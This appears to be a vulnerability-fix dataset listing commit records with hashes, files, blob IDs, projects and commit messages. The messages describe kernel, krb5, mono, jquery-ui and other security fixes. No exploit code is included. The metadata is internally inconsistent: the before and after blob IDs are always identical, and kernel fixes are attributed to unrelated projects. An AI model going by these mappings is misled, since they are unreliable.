Commit With Fix: 
    cf1a0c411b2668c57c41e9c4efd15ba17b6b322c
File(s) In Commit: 
    src/kadmin/server/schpw.c
Blob(s) In Commit: 
    7f455d8640fe443660abaa4dd1897da27222e4e0
Blob(s) Before Fix: 
    7f455d8640fe443660abaa4dd1897da27222e4e0
Projects:
    3van_krb5
Commit Message for cf1a0c411b2668c57c41e9c4efd15ba17b6b322c:
Fix kpasswd UDP ping-pong [CVE-2002-2443]\n\nThe kpasswd service provided by kadmind was vulnerable to a UDP "ping-pong" attack [CVE-2002-2443].  Don't respond to packets unless they pass some basic validation, and don't respond to our own error packets.\n\nSome authors use CVE-1999-0103 to refer to the kpasswd UDP ping-pong attack or UDP ping-pong attacks in general, but there is discussion leading toward narrowing the definition of CVE-1999-0103 to the echo, chargen, or other similar built-in inetd services.\n\nThanks to Vincent Danen for alerting us to this issue.\n\nCVSSv2: AV:N/AC:L/Au:N/C:N/I:N/A:P/E:P/RL:O/RC:C\n\nticket: 7637 (new) target_version: 1.11.3 tags: pullup

======================================================================
Commit With Fix: 
    6c4841c2b6c32a134f9f36e5e08857138cc12b10
File(s) In Commit: 
    arch/powerpc/kernel/traps.c
Blob(s) In Commit: 
    5ed4c2ceb5caa8632c11f229193afe0596893650
Blob(s) Before Fix: 
    5ed4c2ceb5caa8632c11f229193afe0596893650
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for 6c4841c2b6c32a134f9f36e5e08857138cc12b10:
[POWERPC] Never panic when taking altivec exceptions from userspace\n\nAt the moment we rely on a cpu feature bit or a firmware property to detect altivec. If we dont have either of these and the cpu does in fact support altivec we can cause a panic from userspace.\n\nIt seems safer to always send a signal if we manage to get an 0xf20 exception from userspace.\n\nSigned-off-by: Anton Blanchard <anton@samba.org> Signed-off-by: Paul Mackerras <paulus@samba.org>

======================================================================
Commit With Fix: 
    0b29669c065f60501e7289e1950fa2a618962358
File(s) In Commit: 
    drivers/media/video/videobuf-vmalloc.c
Blob(s) In Commit: 
    e01259438bb2755bd8bf284554675145282086aa
Blob(s) Before Fix: 
    e01259438bb2755bd8bf284554675145282086aa
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for 0b29669c065f60501e7289e1950fa2a618962358:
V4L/DVB (6751): V4L: Memory leak!  Fix count in videobuf-vmalloc mmap\n\nThis is pretty serious bug.  map->count is never initialized after the call to kmalloc making the count start at some random trash value.  The end result is leaking videobufs.\n\nAlso, fix up the debug statements to print unsigned values.\n\nPushed to http://ifup.org/hg/v4l-dvb too\n\nSigned-off-by: Brandon Philips <bphilips@suse.de> Signed-off-by: Mauro Carvalho Chehab <mchehab@infradead.org>

======================================================================
Commit With Fix: 
    8beacc646acb67c995aea10ac5585970efc7355a
File(s) In Commit: 
    README.md
Blob(s) In Commit: 
    6f45a78d720c5175043436204c471ef0e33f5b30
Blob(s) Before Fix: 
    6f45a78d720c5175043436204c471ef0e33f5b30
Projects:
    01i_PHPMailer
Commit Message for 8beacc646acb67c995aea10ac5585970efc7355a:
Add security notices

======================================================================
Commit With Fix: 
    124d3b7041f9a0ca7c43a6293e1cae4576c32fd5
File(s) In Commit: 
    mm/filemap.c
Blob(s) In Commit: 
    76bea88cbebcb6201d87574890f476ff0051caee
Blob(s) Before Fix: 
    76bea88cbebcb6201d87574890f476ff0051caee
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for 124d3b7041f9a0ca7c43a6293e1cae4576c32fd5:
fix writev regression: pan hanging unkillable and un-straceable\n\nFrederik Himpe reported an unkillable and un-straceable pan process.\n\nZero length iovecs can go into an infinite loop in writev, because the iovec iterator does not always advance over them.\n\nThe sequence required to trigger this is not trivial. I think it requires that a zero-length iovec be followed by a non-zero-length iovec which causes a pagefault in the atomic usercopy. This causes the writev code to drop back into single-segment copy mode, which then tries to copy the 0 bytes of the zero-length iovec  a zero length copy looks like a failure though, so it loops.\n\nPut a test into iov_iter_advance to catch zero-length iovecs. We could just put the test in the fallback path, but I feel it is more robust to skip over zero-length iovecs throughout the code (iovec iterator may be used in filesystems too, so it should be robust).\n\nSigned-off-by: Nick Piggin <npiggin@suse.de> Signed-off-by: Ingo Molnar <mingo@elte.hu> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    aba6681660f65af7f1676434da68c10298c30200
File(s) In Commit: 
    src/java/org/orbeon/oxf/xml/xerces/XercesSAXParserFactoryImpl.java
Blob(s) In Commit: 
    fc0d716f4145caea42b2b2f118b01cfea6258783
Blob(s) Before Fix: 
    fc0d716f4145caea42b2b2f118b01cfea6258783
Projects:
    3etechinns_orbeon-forms
Commit Message for aba6681660f65af7f1676434da68c10298c30200:
Implemented "[ #315668 ] Disable loading of external entities in XML parsing by default".

======================================================================
Commit With Fix: 
    8e890a3bf80a4620e417814dc14886b1bbd17625
File(s) In Commit: 
    mono/metadata/loader.c
Blob(s) In Commit: 
    db126b8d096260cc708d172c500fe153e3ec7fac
Blob(s) Before Fix: 
    db126b8d096260cc708d172c500fe153e3ec7fac
Projects:
    004307ec_mono
Commit Message for 8e890a3bf80a4620e417814dc14886b1bbd17625:
Search for dllimported shared libs in the base directory, not cwd.\n\n* loader.c: we don't search the current directory anymore for shared libraries referenced in DllImport attributes, as it has a slight security risk. We search in the same directory where the referencing image was loaded from, instead. Fixes bug# 641915.

======================================================================
Commit With Fix: 
    a2ae4cc9a16e211c8a128ba10d22a85431f093ab
File(s) In Commit: 
    fs/notify/inotify/inotify_user.c
Blob(s) In Commit: 
    4cd5d5d78f9fa2b85f38bd9422efc3d387780295
Blob(s) Before Fix: 
    4cd5d5d78f9fa2b85f38bd9422efc3d387780295
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a2ae4cc9a16e211c8a128ba10d22a85431f093ab:
inotify: stop kernel memory leak on file creation failure\n\nIf inotify_init is unable to allocate a new file for the new inotify group we leak the new group.  This patch drops the reference on the group on file allocation failure.\n\nReported-by: Vegard Nossum <vegard.nossum@gmail.com> cc: stable@kernel.org Signed-off-by: Eric Paris <eparis@redhat.com>

======================================================================
Commit With Fix: 
    0a54917c3fc295cb61f3fb52373c173fd3b69f48
File(s) In Commit: 
    drivers/net/wireless/orinoco/wext.c
Blob(s) In Commit: 
    e5afabee60d1834b898193479cf710c3bb3eed22
Blob(s) Before Fix: 
    e5afabee60d1834b898193479cf710c3bb3eed22
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 0a54917c3fc295cb61f3fb52373c173fd3b69f48:
orinoco: fix TKIP countermeasure behaviour\n\nEnable the port when disabling countermeasures, and disable it on enabling countermeasures.\n\nThis bug causes the response of the system to certain attacks to be ineffective.\n\nIt also prevents wpa_supplicant from getting scan results, as wpa_supplicant disables countermeasures on startup - preventing the hardware from scanning.\n\nwpa_supplicant works with ap_mode=2 despite this bug because the commit handler re-enables the port.\n\nThe log tends to look like:\n\nState: DISCONNECTED -> SCANNING Starting AP scan for wildcard SSID Scan requested (ret=0) - scan timeout 5 seconds EAPOL: disable timer tick EAPOL: Supplicant port status: Unauthorized Scan timeout - try to get results Failed to get scan results Failed to get scan results - try scanning again Setting scan request: 1 sec 0 usec Starting AP scan for wildcard SSID Scan requested (ret=-1) - scan timeout 5 seconds Failed to initiate AP scan.\n\nReported by: Giacomo Comes <comes@naic.edu> Signed-off by: David Kilroy <kilroyd@googlemail.com> Cc: stable@kernel.org Signed-off-by: John W. Linville <linville@tuxdriver.com>

======================================================================
Commit With Fix: 
    7572777eef78ebdee1ecb7c258c0ef94d35bad16
File(s) In Commit: 
    fs/fuse/file.c
Blob(s) In Commit: 
    8b984a2cebbda185af01a6d4d5f8c31c89fc6fbe
Blob(s) Before Fix: 
    8b984a2cebbda185af01a6d4d5f8c31c89fc6fbe
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 7572777eef78ebdee1ecb7c258c0ef94d35bad16:
fuse: verify ioctl retries\n\nVerify that the total length of the iovec returned in FUSE_IOCTL_RETRY doesn't overflow iov_length().\n\nSigned-off-by: Miklos Szeredi <mszeredi@suse.cz> CC: Tejun Heo <tj@kernel.org> CC: <stable@kernel.org>         [2.6.31+]

======================================================================
Commit With Fix: 
    c3bb41f727fbe00e5de719d687757b24c8dcdfc8
File(s) In Commit: 
    chef-server-api/app/controllers/users.rb
Blob(s) In Commit: 
    a336f04f03f0f0cfe470f1a21e09c9499b7c30b7
Blob(s) Before Fix: 
    a336f04f03f0f0cfe470f1a21e09c9499b7c30b7
Projects:
    17601606252_chef
Commit Message for c3bb41f727fbe00e5de719d687757b24c8dcdfc8:
CHEF-1289 API does not check for admin rights for user management

======================================================================
Commit With Fix: 
    7e9060c109b928769a664dbcc2c17bd21231b6f3
File(s) In Commit: 
    ui/jquery.ui.dialog.js
Blob(s) In Commit: 
    808d31d5b2b7c319a034af2440013ac676d7fd2f
Blob(s) Before Fix: 
    808d31d5b2b7c319a034af2440013ac676d7fd2f
Projects:
    0-wiz-0_jquery-ui
Commit Message for 7e9060c109b928769a664dbcc2c17bd21231b6f3:
Dialog: Extract setting the title into a _title method, use .text() to prevent XSS. Fixes #6016 - Dialog: Title XSS Vulnerability.

======================================================================
Commit With Fix: 
    fc3a9157d3148ab91039c75423da8ef97be3e105
File(s) In Commit: 
    arch/x86/kvm/x86.c
Blob(s) In Commit: 
    8b4d5fc080125071e53325f658efeaabd159f44d
Blob(s) Before Fix: 
    8b4d5fc080125071e53325f658efeaabd159f44d
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for fc3a9157d3148ab91039c75423da8ef97be3e105:
KVM: X86: Don't report L2 emulation failures to user-space\n\nThis patch prevents that emulation failures which result from emulating an instruction for an L2-Guest results in being reported to userspace. Without this patch a malicious L2-Guest would be able to kill the L1 by triggering a race-condition between an vmexit and the instruction emulator. With this patch the L2 will most likely only kill itself in this situation.\n\nSigned-off-by: Joerg Roedel <joerg.roedel@amd.com> Signed-off-by: Marcelo Tosatti <mtosatti@redhat.com>

======================================================================
Commit With Fix: 
    867c20265459d30a01b021a9c1e81fb4c5832aa9
File(s) In Commit: 
    security/integrity/ima/ima_policy.c
Blob(s) In Commit: 
    d661afbe474c2fce8f74907869be0a644c5789c9
Blob(s) Before Fix: 
    d661afbe474c2fce8f74907869be0a644c5789c9
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 867c20265459d30a01b021a9c1e81fb4c5832aa9:
ima: fix add LSM rule bug\n\nIf security_filter_rule_init() doesn't return a rule, then not everything is as fine as the return code implies.\n\nThis bug only occurs when the LSM (eg. SELinux) is disabled at runtime.\n\nAdding an empty LSM rule causes ima_match_rules() to always succeed, ignoring any remaining rules.\n\n default IMA TCB policy:   # PROC_SUPER_MAGIC   dont_measure fsmagic=0x9fa0   # SYSFS_MAGIC   dont_measure fsmagic=0x62656572   # DEBUGFS_MAGIC   dont_measure fsmagic=0x64626720   # TMPFS_MAGIC   dont_measure fsmagic=0x01021994   # SECURITYFS_MAGIC   dont_measure fsmagic=0x73636673\n\n  < LSM specific rule >   dont_measure obj_type=var_log_t\n\n  measure func=BPRM_CHECK   measure func=FILE_MMAP mask=MAY_EXEC   measure func=FILE_CHECK mask=MAY_READ uid=0\n\nThus without the patch, with the boot parameters 'tcb selinux=0', adding the above 'dont_measure obj_type=var_log_t' rule to the default IMA TCB measurement policy, would result in nothing being measured.  The patch prevents the default TCB policy from being replaced.\n\nSigned-off-by: Mimi Zohar <zohar@us.ibm.com> Cc: James Morris <jmorris@namei.org> Acked-by: Serge Hallyn <serge.hallyn@canonical.com> Cc: David Safford <safford@watson.ibm.com> Cc: <stable@kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    3ef52043861ab16352d49af89e048ba6339d6df8
File(s) In Commit: 
    nbd-server.c
Blob(s) In Commit: 
    b47da867a828a6220fda1dfdb6126801618a056f
Blob(s) Before Fix: 
    b47da867a828a6220fda1dfdb6126801618a056f
Projects:
    363921219_nbd
Commit Message for 3ef52043861ab16352d49af89e048ba6339d6df8:
Fix buffer size checking\n\nYes, this means we've re-introduced CVE-2005-3534. Sigh.

======================================================================
Commit With Fix: 
    6b0d6a9b4296fa16a28d10d416db7a770fc03287
File(s) In Commit: 
    net/bridge/br_multicast.c
Blob(s) In Commit: 
    fdbd41c76ec45273155d9a99c67a655bc33e8ec6
Blob(s) Before Fix: 
    fdbd41c76ec45273155d9a99c67a655bc33e8ec6
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 6b0d6a9b4296fa16a28d10d416db7a770fc03287:
bridge: Fix mglist corruption that leads to memory corruption\n\nThe list mp->mglist is used to indicate whether a multicast group is active on the bridge interface itself as opposed to one of the constituent interfaces in the bridge.\n\nUnfortunately the operation that adds the mp->mglist node to the list neglected to check whether it has already been added.  This leads to list corruption in the form of nodes pointing to itself.\n\nNormally this would be quite obvious as it would cause an infinite loop when walking the list.  However, as this list is never actually walked (which means that we don't really need it, I'll get rid of it in a subsequent patch), this instead is hidden until we perform a delete operation on the affected nodes.\n\nAs the same node may now be pointed to by more than one node, the delete operations can then cause modification of freed memory.\n\nThis was observed in practice to cause corruption in 512-byte slabs, most commonly leading to crashes in jbd2.\n\nThanks to Josef Bacik for pointing me in the right direction.\n\nReported-by: Ian Page Hands <ihands@redhat.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    035c8587c0d8d307e45f1b7171a0d337bb451f1e
File(s) In Commit: 
    mono/metadata/icall.c
Blob(s) In Commit: 
    b75791231e2ac7f9e298bc78d7fa5b4ef2dad832
Blob(s) Before Fix: 
    b75791231e2ac7f9e298bc78d7fa5b4ef2dad832
Projects:
    004307ec_mono
Commit Message for 035c8587c0d8d307e45f1b7171a0d337bb451f1e:
Allow only primitive types/enums in RuntimeHelpers.InitializeArray ().

======================================================================
Commit With Fix: 
    2f00e4bbb2137130845afb1b2a1e678552fc8e5c
File(s) In Commit: 
    mono/metadata/icall.c
Blob(s) In Commit: 
    6e20125f471a4396ebfc6d11edf93916f0338f30
Blob(s) Before Fix: 
    6e20125f471a4396ebfc6d11edf93916f0338f30
Projects:
    004307ec_mono
Commit Message for 2f00e4bbb2137130845afb1b2a1e678552fc8e5c:
Disable some of the FastCopy fast paths since they are racy.

======================================================================
Commit With Fix: 
    722f9890f09aadfc37ae479e7d946d5fc5ef7b91
File(s) In Commit: 
    mono/metadata/threads.c
Blob(s) In Commit: 
    a7a721dca8509d2a6670cdacf482e8e3c4493948
Blob(s) Before Fix: 
    a7a721dca8509d2a6670cdacf482e8e3c4493948
Projects:
    0-T-0_ps4-linux
    004307ec_mono
Commit Message for 722f9890f09aadfc37ae479e7d946d5fc5ef7b91:
Fix access to freed members of a dead thread\n\n* threads.c: Fix access to freed members of a dead thread. Found and fixed by Rodrigo Kumpera <rkumpera@novell.com> Ref: CVE-2011-0992

======================================================================
Commit With Fix: 
    2338cd19ed7a7f4c1e94f639ab2789d6586d01f3
File(s) In Commit: 
    lib/RT/Scrips_Overlay.pm
Blob(s) In Commit: 
    1d30702577689cd6452b186a378b2ceaf6029037
Blob(s) Before Fix: 
    1d30702577689cd6452b186a378b2ceaf6029037
Projects:
    2ndQuadrant_rt
Commit Message for 2338cd19ed7a7f4c1e94f639ab2789d6586d01f3:
security fix: clone the ticket to set CurrentUser

======================================================================
Commit With Fix: 
    c4c896e1471aec3b004a693c689f60be3b17ac86
File(s) In Commit: 
    net/bluetooth/sco.c
Blob(s) In Commit: 
    926ed39912ea7e2fd9d601063e0993c85220e226
Blob(s) Before Fix: 
    926ed39912ea7e2fd9d601063e0993c85220e226
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c4c896e1471aec3b004a693c689f60be3b17ac86:
Bluetooth: sco: fix information leak to userspace\n\nstruct sco_conninfo has one padding byte in the end.  Local variable cinfo of type sco_conninfo is copied to userspace with this uninizialized one byte, leading to old stack contents leak.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com> Signed-off-by: Gustavo F. Padovan <padovan@profusion.mobi>

======================================================================
Commit With Fix: 
    43629f8f5ea32a998d06d1bb41eefa0e821ff573
File(s) In Commit: 
    net/bluetooth/bnep/sock.c
Blob(s) In Commit: 
    d935da71ab3b57ff7c46962f339b257f39e57952
Blob(s) Before Fix: 
    d935da71ab3b57ff7c46962f339b257f39e57952
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 43629f8f5ea32a998d06d1bb41eefa0e821ff573:
Bluetooth: bnep: fix buffer overflow\n\nStruct ca is copied from userspace.  It is not checked whether the "device" field is NULL terminated.  This potentially leads to BUG() inside of alloc_netdev_mqs() and/or information leak by creating a device with a name made of contents of kernel stack.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com> Signed-off-by: Gustavo F. Padovan <padovan@profusion.mobi>

======================================================================
Commit With Fix: 
    d846f71195d57b0bbb143382647c2c6638b04c5a
File(s) In Commit: 
    net/bridge/netfilter/ebtables.c
Blob(s) In Commit: 
    893669caa8de6c56960f804da8d2125f07823fb3
Blob(s) Before Fix: 
    893669caa8de6c56960f804da8d2125f07823fb3
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for d846f71195d57b0bbb143382647c2c6638b04c5a:
bridge: netfilter: fix information leak\n\nStruct tmp is copied from userspace.  It is not checked whether the "name" field is NULL terminated.  This may lead to buffer overflow and passing contents of kernel stack as a module name to try_then_request_module() and, consequently, to modprobe commandline.  It would be seen by all userspace processes.\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com> Signed-off-by: Patrick McHardy <kaber@trash.net>

======================================================================
Commit With Fix: 
    1309d7afbed112f0e8e90be9af975550caa0076b
File(s) In Commit: 
    drivers/char/tpm/tpm.c
Blob(s) In Commit: 
    7beb0e25f1e1e2ca192ae563eb43f6dc0147f8f8
Blob(s) Before Fix: 
    7beb0e25f1e1e2ca192ae563eb43f6dc0147f8f8
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 1309d7afbed112f0e8e90be9af975550caa0076b:
char/tpm: Fix unitialized usage of data buffer\n\nThis patch fixes information leakage to the userspace by initializing the data buffer to zero.\n\nReported-by: Peter Huewe <huewe.external@infineon.com> Signed-off-by: Peter Huewe <huewe.external@infineon.com> Signed-off-by: Marcel Selhorst <m.selhorst@sirrix.com> [ Also removed the silly "* sizeof(u8)".  If that isn't 1, we have way   deeper problems than a simple multiplication can fix.   - Linus ] Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    d370af0ef7951188daeb15bae75db7ba57c67846
File(s) In Commit: 
    net/irda/iriap.c
Blob(s) In Commit: 
    36477538cea8eba501f000253b433d673b8d579f
Blob(s) Before Fix: 
    36477538cea8eba501f000253b433d673b8d579f
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for d370af0ef7951188daeb15bae75db7ba57c67846:
irda: validate peer name and attribute lengths\n\nLength fields provided by a peer for names and attributes may be longer than the destination array sizes.  Validate lengths to prevent stack buffer overflows.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: stable@kernel.org Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    da48524eb20662618854bb3df2db01fc65f3070c
File(s) In Commit: 
    kernel/signal.c
Blob(s) In Commit: 
    31751868de8856cbe4ee909ef09915e6a9a9c679
Blob(s) Before Fix: 
    31751868de8856cbe4ee909ef09915e6a9a9c679
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for da48524eb20662618854bb3df2db01fc65f3070c:
Prevent rt_sigqueueinfo and rt_tgsigqueueinfo from spoofing the signal code\n\nUserland should be able to trust the pid and uid of the sender of a signal if the si_code is SI_TKILL.\n\nUnfortunately, the kernel has historically allowed sigqueueinfo() to send any si_code at all (as long as it was negative - to distinguish it from kernel-generated signals like SIGILL etc), so it could spoof a SI_TKILL with incorrect siginfo values.\n\nHappily, it looks like glibc has always set si_code to the appropriate SI_QUEUE, so there are probably no actual user code that ever uses anything but the appropriate SI_QUEUE flag.\n\nSo just tighten the check for si_code (we used to allow any negative value), and add a (one-time) warning in case there are binaries out there that might depend on using other si_code values.\n\nSigned-off-by: Julien Tinnes <jln@google.com> Acked-by: Oleg Nesterov <oleg@redhat.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    4d00135a680727f6c3be78f8befaac009030e4df
File(s) In Commit: 
    sound/oss/opl3.c
Blob(s) In Commit: 
    407cd677950bccb68059fdcd1abec6da914b7a38
Blob(s) Before Fix: 
    407cd677950bccb68059fdcd1abec6da914b7a38
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 4d00135a680727f6c3be78f8befaac009030e4df:
sound/oss/opl3: validate voice and channel indexes\n\nUser-controllable indexes for voice and channel values may cause reading and writing beyond the bounds of their respective arrays, leading to potentially exploitable memory corruption.  Validate these indexes.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: stable@kernel.org Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    be20250c13f88375345ad99950190685eda51eb8
File(s) In Commit: 
    net/rose/rose_subr.c
Blob(s) In Commit: 
    174d51c9ce37774f1a046ff49f0157d265e1a5bb
Blob(s) Before Fix: 
    174d51c9ce37774f1a046ff49f0157d265e1a5bb
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for be20250c13f88375345ad99950190685eda51eb8:
ROSE: prevent heap corruption with bad facilities\n\nWhen parsing the FAC_NATIONAL_DIGIS facilities field, it's possible for a remote host to provide more digipeaters than expected, resulting in heap corruption.  Check against ROSE_MAX_DIGIS to prevent overflows, and abort facilities parsing on failure.\n\nAdditionally, when parsing the FAC_CCITT_DEST_NSAP and FAC_CCITT_SRC_NSAP facilities fields, a remote host can provide a length of less than 10, resulting in an underflow in a memcpy size, causing a kernel panic due to massive heap corruption.  A length of greater than 20 results in a stack overflow of the callsign array.  Abort facilities parsing on these invalid length values.\n\nSigned-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Cc: stable@kernel.org Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    4ce00aef84d1ff7c35f7adbbb99a6241cfda00cc
File(s) In Commit: 
    src/gl-auth-command
Blob(s) In Commit: 
    f3449a59ff658c7078b16d9c674d118f45e1a230
Blob(s) Before Fix: 
    f3449a59ff658c7078b16d9c674d118f45e1a230
Projects:
    1060460048_gitolite
Commit Message for 4ce00aef84d1ff7c35f7adbbb99a6241cfda00cc:
security fix for optional ADC (admin-defined command) feature\n\nThanks to Dylan Simon for catching it...

======================================================================
Commit With Fix: 
    65c4d4ad331e94661de763e9b5304d28698999c4
File(s) In Commit: 
    src/ftp_parser.c
Blob(s) In Commit: 
    69a42a3441266f3e83d83a8597bb80e48c968be5
Blob(s) Before Fix: 
    69a42a3441266f3e83d83a8597bb80e48c968be5
Projects:
    3j9fkyahunqoxwqu_pure-ftpd
Commit Message for 65c4d4ad331e94661de763e9b5304d28698999c4:
Flush the command buffer after switching to TLS. Fixes a flaw similar to CVE-2011-0411.

======================================================================
Commit With Fix: 
    0f22072ab50cac7983f9660d33974b45184da4f9
File(s) In Commit: 
    arch/arm/kernel/sys_oabi-compat.c
Blob(s) In Commit: 
    af0aaebf4de62e16e70fcfcad8ccafece2879217
Blob(s) Before Fix: 
    af0aaebf4de62e16e70fcfcad8ccafece2879217
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 0f22072ab50cac7983f9660d33974b45184da4f9:
ARM: 6891/1: prevent heap corruption in OABI semtimedop\n\nWhen CONFIG_OABI_COMPAT is set, the wrapper for semtimedop does not bound the nsops argument.  A sufficiently large value will cause an integer overflow in allocation size, followed by copying too much data into the allocated buffer.  Fix this by restricting nsops to SEMOPM. Untested.\n\nCc: stable@kernel.org Signed-off-by: Dan Rosenberg <drosenberg@vsecurity.com> Signed-off-by: Russell King <rmk+kernel@arm.linux.org.uk>

======================================================================
Commit With Fix: 
    c2892f02712e9516d72841d5c019ed6916329794
File(s) In Commit: 
    net/ipv4/ip_gre.c
Blob(s) In Commit: 
    a2a5983dbf039b5304e1a76a433462cbf5bc8094
Blob(s) Before Fix: 
    a2a5983dbf039b5304e1a76a433462cbf5bc8094
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for c2892f02712e9516d72841d5c019ed6916329794:
gre: fix netns vs proto registration ordering\n\nGRE protocol receive hook can be called right after protocol addition is done. If netns stuff is not yet initialized, we're going to oops in net_generic().\n\nThis is remotely oopsable if ip_gre is compiled as module and packet comes at unfortunate moment of module loading.\n\nSigned-off-by: Alexey Dobriyan <adobriyan@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    764355487ea220fdc2faf128d577d7f679b91f97
File(s) In Commit: 
    fs/ecryptfs/main.c
Blob(s) In Commit: 
    b4a6befb12168d6b0aa0bb7411794e062ded8734
Blob(s) Before Fix: 
    b4a6befb12168d6b0aa0bb7411794e062ded8734
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 764355487ea220fdc2faf128d577d7f679b91f97:
Ecryptfs: Add mount option to check uid of device being mounted = expect uid\n\nClose a TOCTOU race for mounts done via ecryptfs-mount-private.  The mount source (device) can be raced when the ownership test is done in userspace. Provide Ecryptfs a means to force the uid check at mount time.\n\nSigned-off-by: John Johansen <john.johansen@canonical.com> Cc: <stable@kernel.org> Signed-off-by: Tyler Hicks <tyhicks@linux.vnet.ibm.com>

======================================================================
Commit With Fix: 
    64f3b9e203bd06855072e295557dca1485a2ecba
File(s) In Commit: 
    net/ipv4/ip_fragment.c
Blob(s) In Commit: 
    b1d282f11be7e23ae4099901ac4be00c5fd8cd12
Blob(s) Before Fix: 
    b1d282f11be7e23ae4099901ac4be00c5fd8cd12
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 64f3b9e203bd06855072e295557dca1485a2ecba:
net: ip_expire() must revalidate route\n\nCommit 4a94445c9a5c (net: Use ip_route_input_noref() in input path) added a bug in IP defragmentation handling, in case timeout is fired.\n\nWhen a frame is defragmented, we use last skb dst field when building final skb. Its dst is valid, since we are in rcu read section.\n\nBut if a timeout occurs, we take first queued fragment to build one ICMP TIME EXCEEDED message. Problem is all queued skb have weak dst pointers, since we escaped RCU critical section after their queueing. icmp_send() might dereference a now freed (and possibly reused) part of memory.\n\nCalling skb_dst_drop() and ip_route_input_noref() to revalidate route is the only possible choice.\n\nReported-by: Denys Fedoryshchenko <denys@visp.net.lb> Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    46e3d3ad195dcdc1af1795c96b6e0dc778fb6881
File(s) In Commit: 
    useradmin/user-lib.pl
Blob(s) In Commit: 
    facf25766373c8d991f3de8b527960cddb9fcbce
Blob(s) Before Fix: 
    facf25766373c8d991f3de8b527960cddb9fcbce
Projects:
    Anialation81_webmin
Commit Message for 46e3d3ad195dcdc1af1795c96b6e0dc778fb6881:
Fix possible XSS attack due to user's real name not being escaped

======================================================================
Commit With Fix: 
    8312e3fc9041027a33c8bc667bb99740fdf41dd5
File(s) In Commit: 
    libavformat/ape.c
Blob(s) In Commit: 
    dd2aeb9ff3068d949282a5359ab56685ffa43c65
Blob(s) Before Fix: 
    dd2aeb9ff3068d949282a5359ab56685ffa43c65
Projects:
    00ERNEST00_FFmpeg
Commit Message for 8312e3fc9041027a33c8bc667bb99740fdf41dd5:
Do not attempt to decode APE file with no frames\n\nThis fixes invalid reads/writes with this sample: http://packetstorm.linuxsecurity.com/1103-exploits/vlc105-dos.txt

======================================================================
Commit With Fix: 
    cae13fe4cc3f24820ffb990c09110626837e85d4
File(s) In Commit: 
    fs/partitions/ldm.c
Blob(s) In Commit: 
    a29d5ccf3d54a95099a0ca250f36cbac6dbfba2c
Blob(s) Before Fix: 
    a29d5ccf3d54a95099a0ca250f36cbac6dbfba2c
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for cae13fe4cc3f24820ffb990c09110626837e85d4:
Fix for buffer overflow in ldm_frag_add not sufficient\n\nAs Ben Hutchings discovered [1], the patch for CVE-2011-1017 (buffer overflow in ldm_frag_add) is not sufficient.  The original patch in commit c340b1d64000 ("fs/partitions/ldm.c: fix oops caused by corrupted partition table") does not consider that, for subsequent fragments, previously allocated memory is used.\n\n[1] http://lkml.org/lkml/2011/5/6/407\n\nReported-by: Ben Hutchings <ben@decadent.org.uk> Signed-off-by: Timo Warns <warns@pre-sense.de> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    2b472611a32a72f4a118c069c2d62a1a3f087afd
File(s) In Commit: 
    mm/ksm.c
Blob(s) In Commit: 
    9a68b0cf0a1c4c8009ee25d2990530d7e2927132
Blob(s) Before Fix: 
    9a68b0cf0a1c4c8009ee25d2990530d7e2927132
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2b472611a32a72f4a118c069c2d62a1a3f087afd:
